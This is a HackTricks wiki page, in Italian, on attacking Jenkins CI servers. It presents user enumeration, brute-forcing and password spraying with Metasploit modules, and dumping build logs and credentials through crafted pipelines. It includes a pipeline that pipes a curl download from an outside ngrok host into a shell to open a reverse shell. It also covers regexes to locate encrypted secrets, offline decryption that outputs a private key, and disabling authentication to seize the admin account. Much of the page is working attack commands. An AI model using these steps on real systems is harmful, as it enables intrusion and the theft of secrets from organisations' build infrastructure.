# Jenkins Security

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository su github.

</details>
{% endhint %}

## Informazioni di Base

Jenkins √® uno strumento che offre un metodo semplice per stabilire un ambiente di **integrazione continua** o **consegna continua** (CI/CD) per quasi **qualsiasi** combinazione di **linguaggi di programmazione** e repository di codice sorgente utilizzando pipeline. Inoltre, automatizza varie attivit√† di sviluppo di routine. Sebbene Jenkins non elimini la **necessit√† di creare script per i singoli passaggi**, fornisce un modo pi√π veloce e robusto per integrare l'intera sequenza di strumenti di build, test e deployment rispetto a quanto si possa facilmente costruire manualmente.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumerazione Non Autenticata

Per cercare pagine Jenkins interessanti senza autenticazione come (_/people_ o _/asynchPeople_, che elenca gli utenti attuali) puoi usare:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Verifica se puoi eseguire comandi senza necessit√† di autenticazione:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Senza credenziali puoi guardare all'interno del percorso _**/asynchPeople/**_ o _**/securityRealm/user/admin/search/index?q=**_ per **nomi utente**.

Potresti essere in grado di ottenere la versione di Jenkins dal percorso _**/oops**_ o _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Vulnerabilit√† Conosciute

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Login

Nelle informazioni di base puoi controllare **tutti i modi per accedere a Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registrazione

Sarai in grado di trovare istanze di Jenkins che **ti permettono di creare un account e accedere. Semplice come quello.**

### **SSO Login**

Inoltre, se la **funzionalit√†**/**plugin SSO** fossero presenti, dovresti tentare di **accedere** all'applicazione utilizzando un account di test (ad esempio, un account di test **Github/Bitbucket**). Trucco da [**qui**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** manca di **politica delle password** e di **mitigazione del brute-force sui nomi utente**. √à essenziale **bruteforzare** gli utenti poich√© potrebbero essere in uso **password deboli** o **nomi utente come password**, persino **nomi utente invertiti come password**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Usa [questo script python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) o [questo script powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Molte organizzazioni combinano **sistemi di gestione del controllo del codice sorgente (SCM) basati su SaaS** come GitHub o GitLab con una soluzione **CI interna e self-hosted** come Jenkins o TeamCity. Questa configurazione consente ai sistemi CI di **ricevere eventi webhook dai fornitori di controllo del codice sorgente SaaS**, principalmente per attivare i lavori della pipeline.

Per ottenere questo, le organizzazioni **whitelistano** gli **intervalli di IP** delle **piattaforme SCM**, permettendo loro di accedere al **sistema CI interno** tramite **webhook**. Tuttavia, √® importante notare che **chiunque** pu√≤ creare un **account** su GitHub o GitLab e configurarlo per **attivare un webhook**, potenzialmente inviando richieste al **sistema CI interno**.

Controlla: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Abusi su Jenkins Interno

In questi scenari supponiamo che tu abbia un account valido per accedere a Jenkins.

{% hint style="warning" %}
A seconda del meccanismo di **Autorizzazione** configurato in Jenkins e dei permessi dell'utente compromesso, **potresti essere in grado o meno di eseguire i seguenti attacchi.**
{% endhint %}

Per maggiori informazioni controlla le informazioni di base:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Elencare gli utenti

Se hai accesso a Jenkins puoi elencare altri utenti registrati in [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds per trovare segreti in chiaro

Usa [questo script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) per dumpare gli output della console di build e le variabili di ambiente di build per sperare di trovare segreti in chiaro.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Rubare le Credenziali SSH**

Se l'utente compromesso ha **abbastanza privilegi per creare/modificare un nuovo nodo Jenkins** e le credenziali SSH sono gi√† memorizzate per accedere ad altri nodi, potrebbe **rubare quelle credenziali** creando/modificando un nodo e **impostando un host che registrer√† le credenziali** senza verificare la chiave dell'host:

![](<../../.gitbook/assets/image (218).png>)

Di solito troverai le credenziali ssh di Jenkins in un **provider globale** (`/credentials/`), quindi puoi anche scaricarle come faresti con qualsiasi altro segreto. Maggiori informazioni nella [**sezione Dumping secrets**](./#dumping-secrets).

### **RCE in Jenkins**

Ottenere una **shell nel server Jenkins** d√† all'attaccante l'opportunit√† di rubare tutti i **segreti** e le **variabili d'ambiente** e di **sfruttare altre macchine** situate nella stessa rete o persino **raccogliere credenziali cloud**.

Per impostazione predefinita, Jenkins verr√† **eseguito come SYSTEM**. Quindi, comprometterlo dar√† all'attaccante **privilegi SYSTEM**.

### **RCE Creando/Modificando un progetto**

Creare/Modificare un progetto √® un modo per ottenere RCE sul server Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Eseguendo uno script Groovy**

Puoi anche ottenere RCE eseguendo uno script Groovy, che potrebbe essere pi√π furtivo rispetto alla creazione di un nuovo progetto:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Creando/Modificando Pipeline

Puoi anche ottenere **RCE creando/modificando una pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Sfruttamento delle Pipeline

Per sfruttare le pipeline √® ancora necessario avere accesso a Jenkins.

### Build Pipelines

Le **pipeline** possono anche essere utilizzate come **meccanismo di build nei progetti**, in tal caso pu√≤ essere configurato un **file all'interno del repository** che conterr√† la sintassi della pipeline. Per impostazione predefinita viene utilizzato `/Jenkinsfile`:

![](<../../.gitbook/assets/image (127).png>)

√à anche possibile **memorizzare i file di configurazione della pipeline in altri luoghi** (in altri repository per esempio) con l'obiettivo di **separare** l'accesso al repository e l'accesso alla pipeline.

Se un attaccante ha **accesso in scrittura su quel file** sar√† in grado di **modificarlo** e **potenzialmente attivare** la pipeline senza nemmeno avere accesso a Jenkins.\
√à possibile che l'attaccante debba **bypassare alcune protezioni del branch** (a seconda della piattaforma e dei privilegi dell'utente potrebbero essere bypassate o meno).

I trigger pi√π comuni per eseguire una pipeline personalizzata sono:

* **Pull request** al branch principale (o potenzialmente ad altri branch)
* **Push al branch principale** (o potenzialmente ad altri branch)
* **Aggiornare il branch principale** e attendere che venga eseguito in qualche modo

{% hint style="info" %}
Se sei un **utente esterno** non dovresti aspettarti di creare una **PR al branch principale** del repo di **un altro utente/organizzazione** e **attivare la pipeline**... ma se √® **configurato male** potresti **compromettere completamente le aziende solo sfruttando questo**.
{% endhint %}

### Pipeline RCE

Nella sezione RCE precedente √® stata gi√† indicata una tecnica per [**ottenere RCE modificando una pipeline**](./#rce-creating-modifying-pipeline).

### Controllo delle variabili d'ambiente

√à possibile dichiarare **variabili d'ambiente in chiaro** per l'intera pipeline o per fasi specifiche. Queste variabili d'ambiente **non dovrebbero contenere informazioni sensibili**, ma un attaccante potrebbe sempre **controllare tutte le configurazioni della pipeline/Jenkinsfile**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Per informazioni su come vengono generalmente trattati i secrets da Jenkins, consulta le informazioni di base:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Le credenziali possono essere **scoped to global providers** (`/credentials/`) o a **specific projects** (`/job/<project-name>/configure`). Pertanto, per esfiltrare tutte le credenziali √® necessario **compromettere almeno tutti i progetti** che contengono secrets ed eseguire pipeline personalizzate/avvelenate.

C'√® un altro problema, per ottenere un **secret all'interno dell'env** di una pipeline √® necessario **conoscere il nome e il tipo del secret**. Ad esempio, se provi a **caricare** un **`usernamePassword`** **secret** come un **`string`** **secret** otterrai questo **errore**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Ecco il modo per caricare alcuni tipi comuni di segreti:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Alla fine di questa pagina puoi **trovare tutti i tipi di credenziali**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Il modo migliore per **scaricare tutti i segreti in una volta sola** √® **compromettere** la macchina **Jenkins** (eseguendo una reverse shell nel **nodo integrato** per esempio) e poi **trapelare** le **chiavi master** e i **segreti criptati** e decrittarli offline.\
Maggiori informazioni su come fare questo nella [sezione Nodi & Agenti](./#nodes-and-agents) e nella [sezione Post Exploitation](./#post-exploitation).
{% endhint %}

### Trigger

Dalla [documentazione](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): La direttiva `triggers` definisce i **modi automatizzati in cui la Pipeline dovrebbe essere riattivata**. Per le Pipeline integrate con una fonte come GitHub o BitBucket, `triggers` potrebbero non essere necessari poich√© l'integrazione basata su webhooks sar√† probabilmente gi√† presente. I trigger attualmente disponibili sono `cron`, `pollSCM` e `upstream`.

Esempio di Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **other examples in the docs**.

### Nodes & Agents

Una **istanza Jenkins** potrebbe avere **diversi agenti in esecuzione su macchine diverse**. Dal punto di vista di un attaccante, l'accesso a macchine diverse significa **diverse potenziali credenziali cloud** da rubare o **diverso accesso alla rete** che potrebbe essere sfruttato per compromettere altre macchine.

Per maggiori informazioni, controlla le informazioni di base:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Puoi enumerare i **nodi configurati** in `/computer/`, di solito troverai il **`Built-In Node`** (che √® il nodo che esegue Jenkins) e potenzialmente altri:

![](<../../.gitbook/assets/image (249).png>)

√à **particolarmente interessante compromettere il nodo Built-In** perch√© contiene informazioni sensibili di Jenkins.

Per indicare che vuoi **eseguire** la **pipeline** nel **nodo Jenkins integrato** puoi specificare all'interno della pipeline la seguente configurazione:
```bash
pipeline {
agent {label 'built-in'}
```
### Esempio completo

Pipeline in un agente specifico, con un trigger cron, con variabili di pipeline e di stage, caricando 2 variabili in uno step e inviando una reverse shell:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

Puoi elencare i segreti accedendo a `/credentials/` se hai abbastanza permessi. Nota che questo elencher√† solo i segreti all'interno del file `credentials.xml`, ma i **file di configurazione delle build** potrebbero avere **pi√π credenziali**.

Se puoi **vedere la configurazione di ogni progetto**, puoi anche vedere l√¨ i **nomi delle credenziali (segreti)** utilizzati per accedere al repository e **altre credenziali del progetto**.

![](<../../.gitbook/assets/image (180).png>)

#### Da Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Da disco

Questi file sono necessari per **decriptare i segreti di Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

Tali **segreti possono solitamente essere trovati in**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Ecco una regex per trovarli:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

Se hai estratto le **password necessarie per decrittare i segreti**, usa [**questo script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **per decrittare quei segreti**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Decrypt Jenkins secrets from Groovy

#### Decriptare i segreti di Jenkins da Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Creare un nuovo utente admin

1. Accedi al file config.xml di Jenkins in `/var/lib/jenkins/config.xml` o `C:\Program Files (x86)\Jenkis\`
2. Cerca la parola `<useSecurity>true</useSecurity>` e cambia la parola \*\*`true` \*\* in **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Riavvia** il server **Jenkins**: `service jenkins restart`
4. Ora vai di nuovo al portale Jenkins e **Jenkins non chieder√† alcuna credenziale** questa volta. Naviga su "**Manage Jenkins**" per impostare nuovamente la **password dell'amministratore**.
5. **Abilita** di nuovo la **sicurezza** cambiando le impostazioni in `<useSecurity>true</useSecurity>` e **riavvia di nuovo Jenkins**.

## Riferimenti

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repo di github.

</details>
{% endhint %}
